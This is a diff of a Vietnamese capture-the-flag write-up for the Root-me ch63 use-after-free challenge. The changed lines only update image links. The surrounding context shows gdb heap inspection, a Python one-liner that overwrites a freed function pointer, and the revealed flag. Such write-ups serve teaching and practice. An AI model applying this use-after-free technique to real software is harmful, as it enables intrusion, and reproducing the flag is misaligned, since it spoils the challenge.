@@ -277,9 +277,9 @@ Breakpoint 4 at 0x8048871
 run
 ```
 - Chọn 1 và nhập giá trị **AAAA**, nhập c để chương trình tiếp tục chạy
-![](Images/1.jpg)
+![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/1.JPG)
 - Chọn 4 để free dog. Chương trình sẽ break trước khi thực hiện việc free, vì vậy lúc này ta có thể kiểm tra thông tin heap.
-![](Images/2.jpg)
+![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/2.JPG)
 - Sử dụng **info proc map** để tìm địa chỉ của vùng heap
 ```
 (gdb) info proc map
@@ -322,7 +322,7 @@ bringBackTheFlag in section .text of /challenge/app-systeme/ch63/ch63
 death in section .text of /challenge/app-systeme/ch63/ch63
 ```
 - Nhập c để tiếp tục và chọn 5. Lúc này chương trình sẽ bị break sau khi free dog. Ta tiếp tục kiểm tra thông tin heap
-![](Images/3.jpg)
+![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/3.JPG)
 ```
 (gdb) x/100x 0x9595000
 0x9595000:      0x00000000      0x00000021      0x00000000      0x00000000
@@ -331,7 +331,7 @@ death in section .text of /challenge/app-systeme/ch63/ch63
 ```
 - Ta có thể thấy được vùng dữ liệu đã được giải phóng. Do con trỏ không được reset, nên ta vẫn có thể gọi được dog->bark qua options 2.(Chó chết rồi nhưng vẫn sủa được)
 - Nhập c để tiếp tục thực hiện việc điền thông tin cho DogHouse Với address là **BBBBCCCCDDDDEEEE** và Name là **FFFF**
-![](Images/4.jpg)
+![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/4.JPG)
 - Nhập 2 để gọi **bark**, chương trình sẽ crash trước khi gọi **bark**
 ```
 Where do you build it?
@@ -365,7 +365,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 python -c "print '1\n' + 'AAAA\n' + '4\n' + '5\n' + 'BBBBCCCCDDDD\xcb\x87\x04\x08\n' + 'FFFF\n' + '2\n'" | ./ch63
 ```
-![](Images/5.jpg)
+![](https://raw.githubusercontent.com/jkana/Writeup/main/Root-me/Images/5.JPG)
 **5.Flag**
 ```
 U44aafff_U4f_The_d0G
